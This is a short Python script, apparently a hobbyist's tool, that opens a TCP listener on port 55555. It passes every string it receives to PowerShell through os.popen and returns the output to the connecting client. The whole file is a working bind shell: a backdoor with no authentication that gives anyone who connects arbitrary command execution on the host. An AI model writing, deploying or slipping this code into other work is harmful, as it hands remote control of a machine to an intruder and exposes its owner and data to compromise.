__author__ = 'RetR0'

import os
import threading
import socket

host = (socket.gethostbyname(socket.gethostname()))
port = int('55555')
client_list = []

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen()
client, address = server.accept()
print(address)

def reciv():
    while True:
        try:
            it = client.recv(3072)
            it = it.decode('utf-8')
            commandum = (f'powershell /c {it}')
            result = os.popen(commandum).read()
            print (result)
            result = result.encode()
            client.send(result)
        except:
            client.close()
            print ("An error occured!!!")

reciv()
